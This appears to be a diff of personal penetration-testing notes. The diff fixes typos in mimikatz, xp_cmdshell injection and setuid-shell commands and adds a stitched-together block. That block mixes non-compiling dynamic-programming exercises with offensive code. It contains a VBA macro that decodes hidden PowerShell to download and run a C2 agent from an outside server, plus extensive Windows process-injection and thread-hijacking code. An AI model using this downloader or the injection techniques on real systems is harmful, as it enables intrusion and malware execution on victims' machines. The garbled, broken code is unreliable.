@@ -14338,7 +14338,7 @@ reducing the need for a board port scan
   
   kerberos::golden /user:offsec /domain:corp.com /sid:  /target:
   fully qualified host name /service:HTTP hash /rc4: 
-  and atlat inject to memory using  
+  and atlast inject to memory using  
   /ptt
   
   kerberos::list 
@@ -14818,7 +14818,7 @@ select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp.sh; chmod +s /tmp/sh')
 	  cat systemreports.ps1
 
 	  proxychain with nmap
-	  proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +cliipboard 
+	  proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard 
 	  proxychains nmap ---top-ports=20 -sT Pn 10.5.5.20
 	  netstat -ano
 	  
@@ -15790,6 +15790,9 @@ they supports unicode
 		 the hashes are dumped 
 		 
 		 
+		 also 
+		 lsadump::lsa /inject /name:krbtgt
+		 
 		 passing the hash in windows 
 		 ----------------------------
 		   
@@ -16190,7 +16193,7 @@ pastebin
 	 
 	 fo to smb.conf
 	  and set min protocol  == > SMB2 
-	    and start smb daemon 
+	    and start smb deamon 
 		   systemctl start smb.service
 		   
 		smbclient -L 127.0.0.1 -U Administrator
@@ -16491,6 +16494,10 @@ ss -antp | grep "8888"
 	cat /etc/crontab 
 	 
 	 
+	 
+	 --------------------------------------------------------------------------------------------
+	 
+	 
 	 Enumerating installed app and patch levels
 	 -----------------------------------------------
 	 on windows 
@@ -16562,7 +16569,7 @@ ss -antp | grep "8888"
 	all detaisl about mounted file s/
 	cat /etc/fstab 
 	/bin/lsblk 
-	 to display all available disks  partitions 
+	to display all available disks  partitions 
 	 
 	 
 	 
@@ -16668,7 +16675,7 @@ is provided
 	 
 	 
 	 powershell.exe Start-Process cmd.exe -Verb runAs 
-	 //Verb is like gicing option 
+	 //Verb is like giving option 
 	 //runAs administrator 
 	 
 	 
@@ -17265,7 +17272,7 @@ know it using head
 		  BurpSuite Intruder 
 		  --------------------
 		  automate username and password 
-		  ctrl  +I
+		  ctrl + I 
 		   
 		   
 attack type to pitchfork 
@@ -18456,7 +18463,7 @@ that means tell us whether root or not
 			username and password
 			
 			
-			http://localhost/script?0';EXEC+master.. xp_cmdshell+'dir'
+			http://localhost/script?';EXEC+master.. xp_cmdshell+'dir'
 			
 			http://localhost/script?';EXEC+master..xp_servicecontrol+'start',+'server';--
 			
@@ -19076,7 +19083,7 @@ cat bind_shell.key bind_shell.crt > bind_shell.pem
   sudo systemctl start apache2
   
   
-  
+               
 cls
 wget -V 
 
@@ -22446,19 +22453,2452 @@ OK Bye Today
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------
 ROS continued 
+--------------------
+-----------------------------------------------------------------------------
+
+
+Baloon Bursting Problem 
+-------------------------------
+
+public class BurstBalloons 
+{
+private int[][] dp;
+private int[] N ;
+ 
+ 
+ public static void main(String[] args throws Exception)
+ {
+ int[] A = {3,1,5,8};
+ System.out.println(new BurstBalloons().maxCoins(A));
+ }
+ 
+ public int maxCoins(int[] nums)
+ {
+ N  = new int[nums.length + 2];
+ N[0] = N[N.length - 1] = 1;
+ for (int i = 0; i < nums.length; i++)
+ {
+ N[i+1] = nums[i];
+ 
+ }
+ 
+ int[][] DP = new int[N.length][N.length];
+ for(int r =2; r < N.length;r++)
+ {
+ for(int i=0 ; i  <N.length; i++)
+ {
+ int j = i  +r;
+ if (j  < N.length)
+ {
+ int max = Integer.MIN_VALUE;
+ for(int t = i + 1; t < j;  t++)
+ {
+ max = Math.max(max, N[t] * N[i] *N[j] + DP[t][j] + DP[i][t]);
+ 
+ }
+ DP[i][j] = max;
+ 
+ }
+ }
+ }
+ return DP[0][N.length - 1];
+ 
+ 
+ }
+}
+
+
+-------------------------------------------------------------------------------------------------------------
+HouseRobber
+-----------------
+
+import java.util.Arrays;
+
+public class Houserobber{
+public static void main(String[] args throws Exception)
+{
+int[] nums = {6,3,10,8,2,10,3,5,10,5,3};
+System.out.println(new HouseRobber().rob(nums));
+
+}
+
+public int rob(int[]nums){
+if (nums.length == 0)return 0;
+if(nums.length == 1)return nums[0];
+else if (nums.length == 2){
+
+if (nums[0]  >nums[1]) return nums[0];
+return nums[1];
+
+}else if 
+(nums.length == 3)
+return Math.max(Math.max(nums[0], nums[1]),nums[2]);
+int[] DP = new int[nums.length];
+for (int i = nums.length -1,i > 0;i--){
+if (i  +3 < nums.length)
+DP[i] = Math.max(nums[i]  +DP[i+2], nums[i] + DP[i  +3]);
+else if (i  +2 < nums.length)
+DP[i] = nums[i] + DP[i + 2];
+else DP[i] = nums[i];
+
+}
+
+
+itn max = Math.max(DP[1],DP[2]);
+Arrays.fill(DP,0);
+for (int i = nums.length - 2; i >= 2;i--)
+{
+if (i  +3  < nums.length)DP[i] = Math.max(nums[i] + DP[i+2], nums[i] + DP[i + 3]);
+else if (i  +2 < nums.length)
+DP [i] = nums[i]  +DP[i + 2];
+else DP[i] = nums[i];
+ 
+}
+MAX = Math.max(max, Math.max(DP[0,DP[1]]));
+return max;
+
+
+}
+}
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Unique Binary Tree
+----------------------------
+public class UniqueBinarySearchTree {
+int[] dp;
+
+public static void main(String[] args) throws Exception{
+System.out.println(new UniqueBinarySearchTree().numTrees(5));
+
+
+}
+
+public int numTrees(int n)
+{
+dp = new int[n+1];
+dp[0] = 1;
+return dp(n);
+
+}
+
+private int dp(int n)
+{
+if(dp[n] != 0) return dp[n];
+for (int i = 1; i <=n; i++)
+{
+dp[n] += dp(n-i) * dp(n-(n-i)-1);
+
+}
+return dp[n];
+
+}
+}
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+
+Smallest Sufficientteam 
+------------------------------------
+
+
+public class SmallestSufficientTeam{
+public static void main(String[] args)
+{
+String[] req = {"java","nodejs","reactjs"};
+List<List<String>> people = new ArrayList<>();
+people.add(Arrays.asList("java"));
+people.add(Arrays.asList("nodejs"));
+people.add(Arrays.asList("nodejs","reactjs"));
+int[] R = new SmallestSufficientTeam().smallestSufficientTeam(req, people);
+for (int r : R) {
+System.out.print(r + " ");
+
+}
+System.out.prinln();
+
+}
+private int allSkills;
+Map<Integer,Integer> peopleSkillSet;
+Map<String,Integer> skillMap;
+final int MAX_SKILS = 63;
+final int CHOOSE_PEOPLE = 64;
+
+public int[] smallestSufficientTeam(String[] reqskills, Lis<List<String>> people)
+{
+skillMap = new HashMap<>();
+peopleSkillSet = new HashMap<>();
+int i = 0;
+
+for (String s : reqSkills)
+{
+skillMap.put(s,i++);
+
+}
+
+for(int i =0; i < people.size(); i++)
+{
+for (String s : people.get(i))
+{
+int skillIndecx = skillMap.get(s);
+int skills  = peopleSkillSet.getOrDefault(i,0);
+skills = (skills | (1 << skillIndex));
+peopleSkillSet.put(i, skills);
+
+}
+}
+
+int S = ((int) (Math.pow(2, reqSkills.length)) + 1);
+    int[][] DP = new int[S][people.size()];
+    allSkills = (1 << reqSkills.length) - 1;
+    for (i = 0; i < DP.length; i++) {
+      for (int j = 0; j < DP[0].length; j++) {
+        DP[i][j] = -1;
+      }
+    }
+    int n = dp(0, 0, DP);
+    n &= MAX_SKILLS;
+    if (n == Integer.MAX_VALUE) return new int[0];
+    List<Integer> answer = new ArrayList<>();
+    i = 0;
+    for (int j = 0; j < people.size(); j++) {
+      if (((DP[i][j] & MAX_SKILLS) == n) && (DP[i][j] & CHOOSE_PEOPLE) > 0) {
+        i |= (peopleSkillSet.getOrDefault(j, 0));
+        answer.add(j);
+        n--;
+      }
+      if (n == 0) break;
+    }
+    int[] result = new int[answer.size()];
+    for (int a = 0; a < result.length; a++) {
+      result[a] = answer.get(a);
+    }
+    return result;
+  }
+
+  private int dp(int i, int skill, int[][] DP) {
+    if (i >= DP[0].length) {
+      if (skill >= allSkills) {
+        return 0;
+      } else return Integer.MAX_VALUE;
+    }
+    if (skill == allSkills) return 0;
+    else if (DP[skill][i] != -1) return DP[skill][i];
+    else {
+      int withOut = dp(i + 1, skill, DP);
+      int with = dp(i + 1, (skill | peopleSkillSet.getOrDefault(i, 0)), DP);
+      with += with != Integer.MAX_VALUE ? 1 : 0;
+      if (Math.min(with, withOut) == Integer.MAX_VALUE) {
+        DP[skill][i] = Integer.MAX_VALUE;
+      } else
+        DP[skill][i] =
+            ((with & MAX_SKILLS) < (withOut & MAX_SKILLS))
+                ? ((with & MAX_SKILLS) | CHOOSE_PEOPLE)
+                : (withOut & MAX_SKILLS);
+      return DP[skill][i];
+    }
+	
+	
+
+}
+}
+
+---------------------------------------------------------------------------------------------------------------------------------
+Find an element in array such that sum of left array is equal to sum of right array
+
+------------------------------------------------------------------------------------
+
+
+using namespace std;
+int findelement(int arr[], int n)
+{
+int prefixSum[n];
+prefixSum[0] = arr[0];
+for  (int i = 1; i < n; i ++)
+{
+prefixSum[i] = prefixSum[i-1] + arr[i];
+
+
+
+int suffoxSum[n];
+suffixSum[n-1] = arr[n-1];
+
+for (int i = n-1; i>= 0;i--)
+{
+suffixSum[i] = suffixSum[i+1] + arr[i];
+
+for(int i=1; i < n-1; i++)
+{
+if(prefixSum[i] == suffixSum[i])
+return arr[i];
+
+}
+}
+}
+
+
+
+---------------------------------------------------------------------------------------------------------------
+Longest Palindromic SubSequence 
+-------------------------------------------
+
+
+public class Solution
+{
+public static void main(String[] args) throws Exception 
+{
+System.out.println(new Solution().solution("bbab"));
+
+}
+
+public int solution(String s)
+{
+int[][] dp = new int[s.length() + 1][s.length + 1];
+String sI   = new StringBuilder(s).reverse().toString();
+for(int i = 1; l = s.length(); i <= 1; i++)
+
+for(int j = 1; j < =1 ; j++)
+{
+dp[i][j] = (s.charAt(i-1) ) == (sI.charAt(j-1))
+? dp[i-1][j-1] + 1
+: Math.max(dp[i][j-1],dp[i-1][j-1]);
+
+
+}
+   return dp[s.length()][s.length()];
+   
+}
+}
+
+----------------------------------------------------------------------------------------------------------------------------------
+public class LongestIncreasingSubsequence {
+  /**
+   * Main method
+   *
+   * @param args
+   * @throws Exception
+   */
+  public static void main(String[] args) throws Exception {
+    int[] nums = {9, 8, 7, 6};
+    System.out.println(new LongestIncreasingSubsequence().lengthOfLIS(nums));
+  }
+  
+  public int LenthofLIS(int[] nums)
+  {
+  if(nums.length == 0)
+  {
+  return 0;
+  
+  }
+  
+  int[] A = new int[nums.length];
+  int max = integer.MIN_VALUE;
+  for(int i =0 ; l = nums.length;i < l; i++)
+  {
+  int lis =1;
+  for(int j = 0; j < i;j++)
+  {
+  if(nums[i] > nums[j]) 
+  lis = Math.max(lis, A[j] + 1);
+  
+  }
+  A[i] = lis;
+  max = Math.max(max,A[i]);
+  
+  }
+  return max;
+  
+  }
+  }
+  
+  
+  -----------------------------------------------------------------------------------------------------------------------------\
+  
+  Minimum cost to tickets 
+  ----------------------------------
+  public class MinimumCostForTickets {
+
+  public static void main(String[] args) {
+    int[] days = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 31};
+    int[] costs = {2, 7, 15};
+    System.out.println(new MinimumCostForTickets().mincostTickets(days, costs));
+  }
+  
+  public int mincostTickets(int[] days, int[] costs)
+  {
+  
+  
+  int[] min = new int[days.length];
+  Arrays.fill(min, INTEGER.MAX_VALUE);
+  for(int i = days.length -1; i  >=0 ;i--)
+  {
+  for(int j =0 ; j < costs.length;j++)
+  {
+  if(j == 0)
+  {
+  min[i] = Math.min(min[i],costs[j] + ((i  + 1 >= min.length) ? 0 : min[i + 1]));
+  
+  }else if (j == 1)
+  {
+  int c = 0;
+ for(int k = i  +1; k < days.length; k++)
+ {
+ if (days[k] >= (days[i] + 7))
+ c = min[k];
+ break;
+ 
+ }
+  }
+  
+  min[i] = Math.min(min[i], costs[j] + c);
+  
+  }else{
+  itn c = 0;
+  for(int k = i + 1; k < days.length; k++)
+  {
+  if(days[k] >= (days[i] + 30))
+  {
+  c = min[k];
+  break;
+  
+  }
+  }
+  min[i] = Math.min(min[i], costs[j] + c);
+  
+  }
+  }
+  }
+  return min[0];
+  
+  
+  }
+  }
+  
+  
+  
+  ----------------------------------------------------------------------------------------------------------------
+  
+  Minimum number of Tapes 
+  --------------------------------
+  
+  public class MinimumNumberOfTaps {
+  public static void main(String[] args) {
+    int[] A = {0, 1, 2, 0, 0, 1, 1, 0};
+    System.out.println(new MinimumNumberOfTaps().minTaps(7, A));
+  }
+  
+  
+  int[] DP;
+  
+  public int minTaps(int n, int[] ranges)
+  {
+  DP = new int[n + 1];
+  Arrays.fill(DP, -2);
+  return dp(0,0,ranges,n);
+   //u fill dp with - 2
+   
+  }
+ 
+
+private int dp(int i, int prev, int[] R, int n) {
+if( i > n )return 0;
+else  if(DP[i] != -2) return DP[i];
+else{
+int min = Integer.MAX_VALUE;
+int start = R[prev] > 0 ? prev : i;
+for(int j = start; j < start + 100 && j <= n; j++)
+{
+if (j - R[j] < = prev){
+int result = dp(j + R[j] + 1, j + R[j],R,n);
+if(result >= 0)
+min = Math.min(min,result  +1);
+
+}
+}
+}
+
+DP[i] = (min == Integer.MAX_VALUE ? -1  :min);
+return DP[i];
+
+} 
+  
+  
+  }
+  
+ }
+ 
+ 
+ ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ stager payload 
+ launcher.bat 
+ 
+ 
+ stage encoder -noP -sta -w 1 -enc 
+ 
+ 
+ STA  = Single threaded App 
+ --------------------------------------------------------------------------------------------------------------
+ 
+public class LengthofLongestFibonacciSubsequence {
+  public static void main(String[] args) {
+    int[] A = {1, 2, 4, 7, 12, 20};
+    System.out.println(new LengthofLongestFibonacciSubsequence().lenLongestFibSubseq(A));
+  }
+  
+  public int LenLongestFubSubSeq(int[] A)
+{
+if (A.length < 3 ) return 0;
+
+Map<Integer, Map<Integer, Integer>> indexMap = new HashMap<>();
+int max = 0;
+for(int i = A.length - 1;i >= 0; i--)
+{
+Map<Integer, Integer> subHashMap = new HashMap<>();
+for(int j = 0; j < i; j++)
+{
+int sum = A[i]  +A[j];
+if(indexMap.containsKey(sum))
+{
+if(indexMap.get(sum).containsKey(A[i]))
+{
+int value = 1 + indexMap.get(sum).get(A[i]);
+subHashMap.put(A[j], value);
+max = Math.max(max, value);
+
+
+}else{
+subHashMap.put(A[i], 1);
+max = Math.max(max, 1);
+
+}
+}
+}
+indexMap.put(A[i], subHashMap);
+
+}
+return max == 0?0:max + 2;
+
+
+}  
+  }
+  
+  
+  -----------------------------------------------------------------------------------------------------------------------------------------------
+  
+  XOR Program
+  -------------------------
+  #include <iostream>
+  using namespace std;
+   int myXOR(int x, int y)
+   {
+   int res =0;
+   for(int i= 31; i>=0; i--)
+   {
+   bool b1 = x & (1 << i);
+   bool b2 = y & (1<< i);
+   
+   
+   bool XOR  = (b1 & b2) ? 0 : (b1  |b2);
+   res <<= 1;
+   res |= XOR;
+   
+   }
+   return res;
+   
+   }
+   int main()
+   {
+   int x=3, y=5;
+   cout<<"XOR is" << xor(x,y);
+   return 0;
+   
+   }
+   ---------------------------------------------------------------------------------------------------------------
+   Option Explicit
+Private Const clOneMask = 16515072
+Private Const clTwoMask = 258048
+Private Const clThreeMask = 4032
+Private Const clFourMask = 63
+Private Const clHighMask = 16711680
+Private Const clMidMask = 65280
+Private Const clLowMask = 255
+Private Const cl2Exp18 = 262144
+Private Const cl2Exp12 = 4096
+Private Const cl2Exp6 = 64
+Private Const cl2Exp8 = 256
+Private Const cl2Exp16 = 65536
+Public Function monkey(sString As String) As String
+Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte,
+lPowers6(63) As Long, lPowers12(63) As Long
+Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar
+As Long, lPos As Long, sOut As String
+Dim lTemp As Long
+sString = Replace(sString, vbCr, vbNullString)
+sString = Replace(sString, vbLf, vbNullString)
+lTemp = Len(sString) Mod 4
+If InStrRev(sString, "==") Then
+iPad = 2
+ElseIf InStrRev(sString, "=") Then
+iPad = 1
+End If
+For lTemp = 0 To 255
+Select Case lTemp
+Case 65 To 90
+bTrans(lTemp) = lTemp - 65
+Case 97 To 122
+bTrans(lTemp) = lTemp - 71
+Case 48 To 57
+bTrans(lTemp) = lTemp + 4
+Case 43
+bTrans(lTemp) = 62
+Case 47
+bTrans(lTemp) = 63
+End Select
+Next lTemp
+For lTemp = 0 To 63
+lPowers6(lTemp) = lTemp * cl2Exp6
+lPowers12(lTemp) = lTemp * cl2Exp12
+lPowers18(lTemp) = lTemp * cl2Exp18
+Next lTemp
+bIn = StrConv(sString, vbFromUnicode)
+ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)
+For lChar = 0 To UBound(bIn) Step 4
+lQuad = lPowers18(bTrans(bIn(lChar))) +
+lPowers12(bTrans(bIn(lChar + 1))) + _
+lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar +
+3))
+lTemp = lQuad And clHighMask
+bOut(lPos) = lTemp \ cl2Exp16
+lTemp = lQuad And clMidMask
+bOut(lPos + 1) = lTemp \ cl2Exp8
+bOut(lPos + 2) = lQuad And clLowMask
+lPos = lPos + 3
+Next lChar
+sOut = StrConv(bOut, vbUnicode)
+If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)
+monkey = sOut
+End Function
+Sub testb64()
+'
+' testb64 Macro
+'
+'
+Dim PSResp As String
+PSResp =
+Shell(monkey("UG93ZXJTaGVsbCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCd
+odHRwOi8vb3VyYzJzZXJ2ZXIuY29tL2Rvd25sb2FkL2MyYWdlbnQuZXhlJywnYWdlbnQuZXhlJyk7U3
+RhcnQtUHJvY2VzcyAnYWdlbnQuZXhlJw=="), vbHide)
+End Sub
+
+
+
+   -----------------------------------------------------------------------------------------------
+   
+  Bypassing Windows prottection mechanism 
+  ---------------------------------------------
+  
+  HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE,
+process_id);
+MEMORY_BASIC_INFORMATION meminfo;
+VirtualQueryEx(p, target, &meminfo, sizeof(meminfo));
+CFG_CALL_TARGET_INFO cfg;
+cfg.Offset = ((DWORD64)target) - (DWORD64)meminfo.AllocationBase;
+cfg.Flags = CFG_CALL_TARGET_VALID;
+SetProcessValidCallTargets(p, meminfo.AllocationBase, meminfo.RegionSize, 1,
+&cfg);
+
+
+
+HANDLE th=OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
+ntdll!NtQueueApcThread(th, SetProcessMitigationPolicy,
+(void*)ProcessDynamicCodePolicy, ((char*)GetModuleHandleA("ntdll")) + 0x20,
+sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY));
+
+
+
+HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
+process_id);
+LPVOID target_payload=VirtualAllocEx(h,NULL,sizeof(payload), MEM_COMMIT |
+MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Or any other memory allocation technique
+WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL);
+
+
+
+HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
+CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA,
+target_DLL_path, 0, NULL);
+
+
+HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
+CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE) target_execution, RCX, 0,
+NULL);
+
+
+
+HANDLE h = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
+QueueUserAPC((LPTHREAD_START_ROUTINE)target_execution, h, RCX);
+or
+
+ntdll!NtQueueApcThread(h, (LPTHREAD_START_ROUTINE)target_execution, RCX, RDX, R8);
+
+HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
+SuspendThread(t);
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_CONTROL;
+ctx.Rip = (DWORD64)target_execution;
+SetThreadContext(t, &ctx);
+ResumeThread(t);
+
+
+
+HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
+SuspendThread(t);
+CONTEXT ctx;
+ctx.Rip = GADGET_pivot; // pop rsp; ret
+ctx.Rsp -= 8;
+WriteProcessMemory(p, (LPVOID)ctx.Rsp, &new_stack_address, 8, NULL); // Or any
+other memory write technique
+//make sure stack is 16-byte aligned before the return address; make sure there’s
+enough space *below* the entry point for stack used by system calls, etc.
+SetThreadContext(t, &ctx);
+ResumeThread(t);
+
+
+
+void wait_until_done(HANDLE t, DWORD64 expected_rip_value)
+{
+CONTEXT x;
+do
+{
+Sleep(10);
+SuspendThread(t);
+x.ContextFlags = CONTEXT_CONTROL;
+GetThreadContext(t, &x);
+ResumeThread(t);
+} while (x.Rip != expected_rip_value);
+}
+DWORD64 GADGET_loop; // jmp -2
+DWORD64 GADGET_pivot; // pop rsp; ret
+HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
+// Save the thread's state
+SuspendThread(t);
+CONTEXT old_ctx;
+old_ctx.ContextFlags = CONTEXT_ALL;
+GetThreadContext(t, &old_ctx);
+// Hijack thread
+CONTEXT new_ctx = old_ctx;
+new_ctx.Rip = GADGET_pivot;
+new_ctx.Rsp -= 8;
+WriteProcessMemory(p, (LPVOID)new_ctx.Rsp, &new_stack_address, 8, NULL);
+SetThreadContext(t, &new_ctx);
+ResumeThread(t);
+wait_until_done(t, GADGET_loop);
+// Resume execution of original thread logic
+SuspendThread(t);
+SetThreadContext(t, &old_ctx);
+ResumeThread(t);
+
+
+
+HMODULE h = LoadLibraryA(dll_path);
+HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc"); // GetMessage hook
+SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id);
+PostThreadMessage(thread_id, WM_NULL, NULL, NULL);
+
+
+
+void wait_until_done(HANDLE t, DWORD64 expected_rip_value)
+{
+CONTEXT x;
+do
+{
+Sleep(10);
+SuspendThread(t);
+x.ContextFlags = CONTEXT_CONTROL;
+GetThreadContext(t, &x);
+ResumeThread(t);
+}
+while (x.Rip != expected_rip_value);
+}
+DWORD64 GADGET_loop; // jmp -2
+DWORD64 GADGET_write; // mov [rdi],rbx; mov rbx, [rsp+0x60]; add rsp,0x50; pop
+rdi; ret --- this is WRITE rbx at address rdi (and advance Rsp by 0x58…); note that in
+Windows 10 version 1903, the gadget is changed to mov [rdi],rbx; mov rbx, [rsp+0x70];
+add rsp,0x60; pop rdi; ret
+HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
+// Save target thread original state
+SuspendThread(t);
+CONTEXT old_ctx;
+old_ctx.ContextFlags = CONTEXT_ALL;
+GetThreadContext(t, &old_ctx);
+// Prepare new stack in ROP_chain
+DWORD64 new_stack_pos = ((old_ctx.Rsp - (sizeof(ROP_chain)+0x60) +8) &
+0xFFFFFFFFFFFFFFF0) - 8 ; // make sure stack is 16-byte aligned before the return
+address. Use 0x70 in version 1903.
+// Write address of GADGET_loop to the target thread stack (used as part of the
+Write Primitive)
+CONTEXT new_ctx = old_ctx;
+new_ctx.Rsp -= 8+0x58; // use 0x68 in version 1903
+new_ctx.Rbx = GADGET_loop;
+new_ctx.Rdi = new_ctx.Rsp+0x58; // use 0x68 in version 1903
+new_ctx.Rip = GADGET_write;
+SetThreadContext(t, &new_ctx);
+ResumeThread(t);
+wait_until_done(t, GADGET_loop);
+// Write new stack to target process memory space
+for (int i = 0; i < sizeof(ROP_chain)/sizeof(DWORD64); i++)
+{
+SuspendThread(t);
+CONTEXT old_ctx;
+old_ctx.ContextFlags = CONTEXT_ALL;
+GetThreadContext(t, &old_ctx);
+CONTEXT new_ctx = old_ctx;
+new_ctx.Rsp -= 8+0x58; 
+new_ctx.Rbx = ROP_chain[i];
+new_ctx.Rdi = new_stack_pos + sizeof(DWORD64)*i;
+new_ctx.Rip = GADGET_write;
+SetThreadContext(t, &new_ctx);
+ResumeThread(t);
+wait_until_done(t, GADGET_loop);
+}
+// Execute code in target thread, moving RSP to new_stack_pos
+new_ctx = old_ctx;
+new_ctx.Rsp = new_stack_pos;
+new_ctx.Rip = (DWORD64)execution_target;
+SetThreadContext(t, &new_ctx);
+ResumeThread(t);
+wait_until_done(t, GADGET_loop);
+// Resume original flow in target thread
+SuspendThread(t);
+SetThreadContext(t, &old_ctx);
+ResumeThread(t);
+
+
+
+HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
+DWORD process_id;
+GetWindowThreadProcessId(hWindow, &process_id);
+// Using VirtualAllocEx+WriteProcessMemory to write payload and obj, but other
+memory writing techniques are welcome
+HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false,
+process_id);
+DWORD64 obj[2];
+LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(obj), MEM_COMMIT | MEM_RESERVE,
+PAGE_READWRITE);
+obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(obj[1])
+obj[1] = (DWORD64)target_execution;
+WriteProcessMemory(h, target_obj, obj, sizeof(obj), NULL);
+SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
+
+
+
+HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
+DWORD process_id;
+GetWindowThreadProcessId(hWindow, &process_id);
+DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
+HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false,
+process_id);
+// Using VirtualAllocEx+WriteProcessMemory to write payload and obj, but other
+memory writing techniques are welcome
+LPVOID target_payload = VirtualAllocEx(h, NULL, sizeof(payload), MEM_COMMIT |
+MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL); // Make
+sure payload sets eax=2 and rbx=old_obj before returning control. Also take care of stack
+alignment if calling other functions
+DWORD64 new_obj[2];
+LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT |
+MEM_RESERVE, PAGE_READWRITE);
+new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
+new_obj[1] = (DWORD64)target_payload;
+WriteProcessMemory(h, target_obj, obj, sizeof(new_obj), NULL);
+SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
+SendNotifyMessageA(hWindow, WM_PAINT, 0, 0);
+Sleep(1);
+SetWindowLongPtrA(hWindow, 0, old_obj);
+
+
+
+HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,section_name);
+BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
+memcpy(buf+section_size-sizeof(payload), payload, sizeof(payload));
+HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
+process_id);
+char* read_buf = new char[sizeof(payload)];
+SIZE_T region_size;
+for (DWORD64 address = 0; address < 0x00007fffffff0000ull; address += region_size)
+{
+MEMORY_BASIC_INFORMATION mem;
+SIZE_T buffer_size = VirtualQueryEx(h, (LPCVOID)address, &mem,
+sizeof(mem));
+if ((mem.Type == MEM_MAPPED) && (mem.State == MEM_COMMIT) && (mem.Protect
+== PAGE_READWRITE) && (mem.RegionSize == section_size))
+{
+ReadProcessMemory(h, (LPCVOID)(address+section_sizesizeof(payload)), read_buf, sizeof(payload), NULL);
+if (memcmp(read_buf, payload, sizeof(payload)) == 0)
+{
+// the payload is at address + section_size - sizeof(payload);
+…
+break;
+}
+}
+region_size = mem.RegionSize;
+}
+
+
+
+HANDLE th = OpenThread(THREAD_SET_CONTEXT| THREAD_QUERY_INFORMATION, FALSE,
+thread_id);
+ATOM aux = GlobalAddAtomA("b"); // arbitrary one char string
+if (target_payload[0] == '\0')
+{
+printf("Invalid payload (starts with NUL)\n");
+exit(0);
+}
+for (DWORD64 pos = sizeof(target_payload) - 1; pos > 0; pos--)
+{
+if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
+{
+ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)aux,
+(PVOID)(((DWORD64)target_payload) + pos-1), (PVOID)2);
+}
+}
+for (char* pos = payload; pos < (payload + sizeof(payload)); pos += strlen(pos)+1)
+{
+if (*pos == '\0')
+{
+continue;
+}
+ATOM a = GlobalAddAtomA(pos);
+DWORD64 offset = pos - payload;
+ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a,
+(PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos)+1));
+}
+
+
+
+HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
+0, sizeof(payload), NULL);
+LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
+process_id);
+memcpy(map_addr, payload, sizeof(payload));
+LPVOID requested_target_payload=0;
+SIZE_T view_size=0;
+ntdll!NtMapViewOfSection(fm, p, &requested_target_payload, 0, sizeof(payload),
+NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
+target_payload=requested_target_payload;
+
+
+
+MODULEINFO ntdll_info;
+HANDLE ntdll= GetModuleHandleA("ntdll");
+GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info,
+sizeof(ntdll_info));
+HANDLE p = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
+ntdll!NtUnmapViewOfSection(p, ntdll);
+// Use write primitive to allocate ntdll_info.SizeOfImage bytes at address ntdll
+in the target process,
+// and write the patched ntdll code there.
+
+
+
+
+MODULEINFO ntdll_info;
